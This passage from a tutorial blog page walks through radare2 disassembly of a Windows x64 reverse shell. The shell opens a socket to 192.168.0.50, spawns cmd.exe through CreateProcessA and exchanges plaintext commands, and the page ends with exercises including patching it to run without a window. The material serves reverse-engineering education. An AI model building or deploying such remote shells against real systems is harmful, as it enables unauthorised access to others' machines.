+|      |    0x00401683      ba00000000     mov edx, 0
+|      |    0x00401688      4889c1         mov rcx, rax
+|      |    0x0040168b      e850160000     call sym.memset             ; void *memset(void *s, int c, size_t n)
+|      |    0x00401690      c74500680000.  mov dword [rbp], 0x68       ; 'h' ; 104
+|      |    0x00401697      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
+|      |    0x0040169e      488b85280200.  mov rax, qword [arg_228h]   ; [0x228:8]=-1 ; 552
+|      |    0x004016a5      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
+|      |    0x004016a9      488b4560       mov rax, qword [arg_60h]    ; [0x60:8]=-1 ; '`' ; 96
+|      |    0x004016ad      48894558       mov qword [arg_58h], rax    ; [0x58:8]=-1 ; 'X' ; 88
+|      |    0x004016b1      488b4558       mov rax, qword [arg_58h]    ; [0x58:8]=-1 ; 'X' ; 88
+|      |    0x004016b5      48894550       mov qword [arg_50h], rax    ; [0x50:8]=-1 ; 'P' ; 80
+|      |    0x004016b9      488d45d8       lea rax, [local_28h]
+|      |    0x004016bd      488d55e0       lea rdx, [local_20h_2]
+|      |    0x004016c1      4889542448     mov qword [local_48h], rdx
+|      |    0x004016c6      4889ea         mov rdx, rbp
+|      |    0x004016c9      4889542440     mov qword [local_40h], rdx
+|      |    0x004016ce      48c744243800.  mov qword [local_38h], 0
+|      |    0x004016d7      48c744243000.  mov qword [local_30h], 0
+|      |    0x004016e0      c74424280000.  mov dword [local_28h_2], 0
+|      |    0x004016e8      c74424200100.  mov dword [local_20h], 1
+|      |    0x004016f0      41b900000000   mov r9d, 0
+|      |    0x004016f6      41b800000000   mov r8d, 0
+|      |    0x004016fc      4889c2         mov rdx, rax
+|      |    0x004016ff      b900000000     mov ecx, 0
+|      |    0x00401704      488b059d6b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082a8:8]=0x84da reloc.KERNEL32.dll_CreateProcessA
+|      |    0x0040170b      ffd0           call rax
+|      |    0x0040170d      488b45e0       mov rax, qword [local_20h_2]
+|      |    0x00401711      baffffffff     mov edx, 0xffffffff         ; -1
+|      |    0x00401716      4889c1         mov rcx, rax
+|      |    0x00401719      488b05486c00.  mov rax, qword sym.imp.KERNEL32.dll_WaitForSingleObject ; [0x408368:8]=0x86d4 reloc.KERNEL32.dll_WaitForSingleObject
+|      |    0x00401720      ffd0           call rax
+|      |    0x00401722      488b45e0       mov rax, qword [local_20h_2]
+|      |    0x00401726      4889c1         mov rcx, rax
+|      |    0x00401729      488b05706b00.  mov rax, qword sym.imp.KERNEL32.dll_CloseHandle ; [0x4082a0:8]=0x84cc reloc.KERNEL32.dll_CloseHandle
+|      |    0x00401730      ffd0           call rax
+|      |    0x00401732      488b45e8       mov rax, qword [local_18h]
+|      |    0x00401736      4889c1         mov rcx, rax
+|      |    0x00401739      488b05606b00.  mov rax, qword sym.imp.KERNEL32.dll_CloseHandle ; [0x4082a0:8]=0x84cc reloc.KERNEL32.dll_CloseHandle
+|      |    0x00401740      ffd0           call rax
+|      |    0x00401742      488b85280200.  mov rax, qword [arg_228h]   ; [0x228:8]=-1 ; 552
+|      |    0x00401749      4889c1         mov rcx, rax
+|      |    0x0040174c      488b052d6b00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408280:8]=0x84aa reloc.WS2_32.dll_closesocket
+|      |    0x00401753      ffd0           call rax
+|      |    0x00401755      488b05fc6a00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408258:8]=0x8460 reloc.WS2_32.dll_WSACleanup ; "`\x84"
+|      |    0x0040175c      ffd0           call rax
+|      |    0x0040175e      488d0dbf2800.  lea rcx, str.shell_closed   ; 0x404024 ; "shell closed "
+|      |    0x00401765      e866150000     call sym.puts               ; int puts(const char *s)
+|      |    ; JMP XREF from 0x00401669 (sym.doShell)
+|      `--&gt; 0x0040176a      90             nop
+|           0x0040176b      4881c4b00200.  add rsp, 0x2b0
+|           0x00401772      5d             pop rbp
+\           0x00401773      c3             ret
+[0x00401550]&gt;
+</code></pre>
+<p>So we start by seeing “cmd.exe” being initialized inside local_28h:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|           0x00401558      488dac248000.  lea rbp, [local_80h]        ; 0x80 ; 128
+|           0x00401560      48b8636d642e.  movabs rax, 0x6578652e646d63
+|           0x0040156a      488945d8       mov qword [local_28h], rax
+</code></pre></div></div>
+<p>On situations like this, you may want to use something like afvn to rename that variable to cmdExe or something like that, especially on large programs.</p>
+
+<p>Then the WSAStartup call</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|           0x0040157d      488b05f46c00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x408278:8]=0x849c reloc.WS2_32.dll_WSAStartup
+|           0x00401584      ffd0           call rax
+|           0x00401586      c74424280000.  mov dword [local_28h_2], 0
+|           0x0040158e      c74424200000.  mov dword [local_20h], 0
+|           0x00401596      41b900000000   mov r9d, 0
+</code></pre></div></div>
+<p>And an internet socket is created (0,6,1,2)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|           0x0040158e      c74424200000.  mov dword [local_20h], 0
+|           0x00401596      41b900000000   mov r9d, 0
+|           0x0040159c      41b806000000   mov r8d, 6
+|           0x004015a2      ba01000000     mov edx, 1
+|           0x004015a7      b902000000     mov ecx, 2
+|           0x004015ac      488b05bd6c00.  mov rax, qword sym.imp.WS2_32.dll_WSASocketA ; [0x408270:8]=0x848e reloc.WS2_32.dll_WSASocketA
+</code></pre></div></div>
+<p>arg_228h will be the var containing the socket descriptor.</p>
+
+<p>Note that eventhough we are not using the socket() call here, it’s the same (think about retro compatibilitty stuff)</p>
+
+<p>Then as we see htons and inet_addr we can quickly identify ip/port stuff</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|           0x004015b5      488985280200.  mov qword [arg_228h], rax   ; [0x228:8]=-1 ; 552
+|           0x004015bc      66c785800000.  mov word [arg_80h], 2       ; [0x80:2]=0xffff ; 2
+|           0x004015c5      b95b110000     mov ecx, 0x115b
+|           0x004015ca      488b05b76c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x408288:8]=0x84b8 reloc.WS2_32.dll_htons
+|           0x004015d1      ffd0           call rax
+|           0x004015d3      668985820000.  mov word [arg_82h], ax      ; [0x82:2]=0xffff ; 130
+|           0x004015da      488d0d1f2a00.  lea rcx, str.192.168.0.50   ; section..rdata ; 0x404000 ; "192.168.0.50"
+|           0x004015e1      488b05a86c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x408290:8]=0x84c0 reloc.WS2_32.dll_inet_addr
+</code></pre></div></div>
+<p>Now we see that 0x10 as well as arg_80h being passed to the socket:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|           0x004015e1      488b05a86c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0
+|           0x004015e8      ffd0           call rax
+|           0x004015ea      898584000000   mov dword [arg_84h], eax    ; [0x84:4]=-1 ; 132
+|           0x004015f0      488d85800000.  lea rax, [arg_80h]          ; 0x80 ; 128
+[...]
+|           0x00401625      4889c2         mov rdx, rax
+</code></pre></div></div>
+<p>0x10 is the size (16) of the sockaddr struct, we can see that easily:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x00401628]&gt; pxw @ 0x0022fc70
+0x0022fc70  0x5b110002 0x3200a8c0 0x005f2e10 0x00000000  ...[...2.._.....
+0x0022fc80  0x02020202 0x00000000 0x777a94e3 0x00000000  ..........zw....
+</code></pre></div></div>
+<p>As you can easily identify: 0x3200a8c0 == 192.168.0.50 in network byteorder. Be aware of that as most malware programs will already have the thing encoded in byte order to try to avoid basic identification mechanisms</p>
+
+<p>Then the big StartupInfo struct gets initialized:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|      |    0x00401690      c74500680000.  mov dword [rbp], 0x68       ; 'h' ; 104
+|      |    0x00401697      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
+|      |    0x0040169e      488b85280200.  mov rax, qword [arg_228h]   ; [0x228:8]=-1 ; 552
+|      |    0x004016a5      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
+|      |    0x004016a9      488b4560       mov rax, qword [arg_60h]    ; [0x60:8]=-1 ; '`' ; 96
+|      |    0x004016ad      48894558       mov qword [arg_58h], rax    ; rcx ; [0x58:8]=-1
+|      |    0x004016b1      488b4558       mov rax, qword [arg_58h]    ; rcx ; [0x58:8]=-1
+|      |    0x004016b5      48894550       mov qword [arg_50h], rax    ; [0x50:8]=-1 ; 'P' ; 80
+|      |    0x004016b9      488d45d8       lea rax, [local_28h]
+|      |    0x004016bd      488d55e0       lea rdx, [local_20h_2]
+|      |    0x004016c1      4889542448     mov qword [local_48h], rdx
+|      |    0x004016c6      4889ea         mov rdx, rbp
+|      |    0x004016c9      4889542440     mov qword [local_40h], rdx
+|      |    0x004016ce      48c744243800.  mov qword [local_38h], 0
+|      |    0x004016d7      48c744243000.  mov qword [local_30h], 0
+|      |    0x004016e0      c74424280000.  mov dword [local_28h_2], 0
+|      |    0x004016e8      c74424200100.  mov dword [local_20h], 1
+|      |    0x004016f0      41b900000000   mov r9d, 0
+</code></pre></div></div>
+<p>To be then passed to the CreateProcessA call:</p>
+
+<p>And at this point we are done with the program:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|      |    0x004016ff      b900000000     mov ecx, 0
+|      |    0x00401704      488b059d6b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082a8:8]=0x7756ad60 ; "`\xadVw"
+|      |    0x0040170b      ffd0           call rax
+|      |    0x0040170d      488b45e0       mov rax, qword [local_20h_2]
+|      |    0x00401711      baffffffff     mov edx, 0xffffffff         ; -1
+|      |    0x00401716      4889c1         mov rcx, rax
+|      |    0x00401719      488b05486c00.  mov rax, qword sym.imp.KERNEL32.dll_WaitForSingleObject ; [0x408368:8]=0x774f1050 ; "P\x10Ow"
+</code></pre></div></div>
+<p>And the connection begins, in wireshark you should see something like this for the commands:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000097  0a                                                 .
+00000098  43 3a 5c 55 73 65 72 73  5c 6c 61 62 5c 44 6f 63   C:\Users \lab\Doc
+000000A8  75 6d 65 6e 74 73 5c 63  6f 64 65 5c 72 65 76 73   uments\c ode\revs
+000000B8  68 65 6c 6c 3e                                     hell&gt;
+    00000001  64 69 72 0a                                        dir.
+</code></pre></div></div>
+<p>As you see, it is just plain text being sent/received. And that is a problem by the way, as some IDS like snort/suricata can be easily configured to detect and block stuff like this…</p>
+
+<p>So, want to get hands on?</p>
+
+<p>Exercises:</p>
+<ul>
+  <li>Use r2pipe to log connections in the bind shell program</li>
+  <li>Map those structs like processinfo to get a nicer look while reversing</li>
+  <li>Patch the program to act without prompting any window</li>
+</ul>
+
+    </div>
+
+    <div class="post__share">
+  <ul class="share__list list-reset">
+    <li class="share__item">
+      <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/reversing-radare-18"
+        onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+        title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+    </li>
+
+    <li class="share__item">
+      <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Reverse%20engineering%20x64%20binaries%20with%20Radare2%20-%2018%20(Bind%20and%20reverse%20shells)&url=http://localhost:4000/reversing-radare-18"
+        onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+        title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+    </li>
+
+    <li class="share__item">
+      <a class="share__link share__linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/reversing-radare-18&title=Reverse%20engineering%20x64%20binaries%20with%20Radare2%20-%2018%20(Bind%20and%20reverse%20shells)&summary=&source=Artik%20Blue"
+      onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn" rel="nofollow"><i class="ion ion-logo-linkedin"></i></a>
+    </li>
+  </ul>
+</div>
+
+
+    <div class="post__navigation">
+  
+  <a class="post__prev" href="/reversing-radare-17">
+    <div class="prev__image">
+      <img class="lazy" data-src="/images//radare2/radare2_17.png" alt="Reverse engineering x64 binaries with Radare2 - 18 (Bind and reverse shells)">
+    </div>
+    <div class="prev__box">
+      <span class="post__nav post__nav__prev">Older post</span>
+      <h2 class="post__nav__title">Reverse engineering x64 binaries with Radare2 - 17 (winsock, udp C&C and file exfiltration through DNS)</h2>
+    </div>
+  </a>
+  
+
+  
+  <a class="post__next" href="/reversing-radare-19">
+    <div class="next__box">
+      <span class="post__nav post__nav__next">Newer post</span>
+      <h2 class="post__nav__title">Reverse engineering x64 binaries with Radare2 - 19 (unix encrypted bind shells over TLS)</h2>
+    </div>
+    <div class="next__image">
+      <img class="lazy" data-src="/images//radare2/radare2_18.png" alt="Reverse engineering x64 binaries with Radare2 - 18 (Bind and reverse shells)">
+    </div>
+  </a>
+  
+</div>
+
+     <!-- begin comments -->
+<div id="disqus_thread" class="post__comments">
+  <div id="disqus_empty"></div>
+</div>
+
+<script>
+  function load_disqus() {
+    var disqus_shortname = 'artikblue',
+      is_disqus_empty = document.getElementById('disqus_empty'),
+      disqus_target = document.getElementById('disqus_thread'),
+      disqus_embed = document.createElement('script'),
+      disqus_hook = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);
+
+    if (disqus_target && is_disqus_empty) {
+      disqus_embed.type = 'text/javascript';
+      disqus_embed.async = true;
+      disqus_embed.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      disqus_hook.appendChild(disqus_embed);
+      is_disqus_empty.remove();
+    }
+  }
+
+  window.addEventListener('scroll', function (e) {
+    var currentScroll = document.scrollingElement.scrollTop;
+    var disqus_target = document.getElementById('disqus_thread');
+
+    if (disqus_target && (currentScroll > disqus_target.getBoundingClientRect().top - 150)) {
+      load_disqus('disqus_shortname');
+    }
+  }, false);
+
+</script>
+<noscript>Please enable JavaScript to view the
+  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<!-- end comments --> 
+
+  </article>
+</div>
+<!-- end post -->
+      </div>
+      <!-- end wrapper-page -->
+    </main>
+    <!-- end content -->
+    <div class="top" title="Top"><i class="ion ion-ios-arrow-round-up"></i></div>
+    <!-- begin footer -->
+<footer class="footer">
+  <div class="container">
+    <div class="row">
+      <div class="col col-12 col-m-12">
+        <div class="footer__inner">
+
+          <div class="footer__head">
+            <div class="row">
+              <div class="col col-4 col-d-6 col-t-12">
+  <div class="widget widget-recent">
+    <div class="widget__head">
+      <h3 class="widget__title">Recent Posts</h3>
+    </div>
+    
+    <div class="recent-posts">
+      
+      <a class="recent-posts__image" href="/reversing-radare-22">
+        <img class="lazy" data-src="/images//radare2/radare2_22.png" alt="Reverse engineering x64 binaries with Radare2 - Enabling code execution on Stack">
+      </a>
+      
+      <div class="recent-posts__content">
+        <div class="recent-posts__date">
+          <time class="timeago" datetime="2022-06-20T00:01:35+02:00">Jun 20, 2022</time>
+        </div>
+        <h4 class="recent-posts__title"><a href="/reversing-radare-22">Reverse engineering x64 binaries with Radare2 - Enabling code execution on Stack</a></h4>
+      </div>
+    </div>
+    
+    <div class="recent-posts">
+      
+      <a class="recent-posts__image" href="/reversing-radare-21">
+        <img class="lazy" data-src="/images//radare2/radare2_21.png" alt="Reverse engineering x64 binaries with Radare2 - Bypasssing DEP with simple ROP Chains">
+      </a>
+      
+      <div class="recent-posts__content">
+        <div class="recent-posts__date">
+          <time class="timeago" datetime="2022-06-15T00:01:35+02:00">Jun 15, 2022</time>
+        </div>
+        <h4 class="recent-posts__title"><a href="/reversing-radare-21">Reverse engineering x64 binaries with Radare2 - Bypasssing DEP with simple ROP Chains</a></h4>
+      </div>
+    </div>
+    
+  </div>
+</div>
+              <div class="col col-4 col-d-6 col-t-12">
+  <div class="widget widget-gallery">
+    <div class="widget__head">
+      <h3 class="widget__title">Gallery</h3>
+    </div>
+    
+    <div class="gallery-box gallery-footer">
+      <div class="gallery">
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/landscape1.jpg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/sasha1.jpeg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/castle1.jpg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/scotland1.jpg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/sanfran1.jpg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/newyork1.jpg" alt="Minimalism">
+        </div>
+        
+      </div>
+    </div>
+    
+  </div>
+</div>
+              <div class="col col-4 col-d-6 col-t-12">
+  <div class="widget widget-subscribe">
+    <div class="widget__head">
+      <h3 class="widget__title"></h3>
+    </div>
+    <div class="subscribe__inner">
+      <div class="subscribe__group">
+        <div class="subscribe__description"></div>
+      </div>
+      <!-- <form class="subscribe-form validate"
+           action="#" method="POST" id="membedded-subscribe-form" name="membedded-subscribe-form" target="_blank" novalidate>
+           <label class="screen-reader-text" for="mce-EMAIL">Email address</label>
+           <input class="subscribe-email required email" id="mce-EMAIL" type="text" name="EMAIL"
+           placeholder="Your email address">
+           <button class="button subscribe-button" id="membedded-subscribe" type="submit" name="subscribe"></button>
+           </form> -->
+    </div>
+  </div>
+</div>
+
+            </div>
+          </div>
+        </div>
+
+        
+  <div class="social">
+    <ul class="social__list list-reset">
+      
+      <li class="social__item">
+        <a class="social__link" href="https://twitter.com/artikblue" target="_blank" rel="noopener" aria-label="social icon"><i class="ion ion-logo-twitter"></i></a>
+      </li>
+      
+      <li class="social__item">
+        <a class="social__link" href="https://github.com/artikblue" target="_blank" rel="noopener" aria-label="social icon"><i class="ion ion-logo-github"></i></a>
+      </li>
+      
+    </ul>
+  </div>
+
+        <div class="copyright">2022 &copy; <a href="/">Artik Blue</a>
+      </div>
+    </div>
+  </div>
+</footer>
+<!-- end footer -->
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="/js/scripts.js"></script>
+</body>
+
+</html>
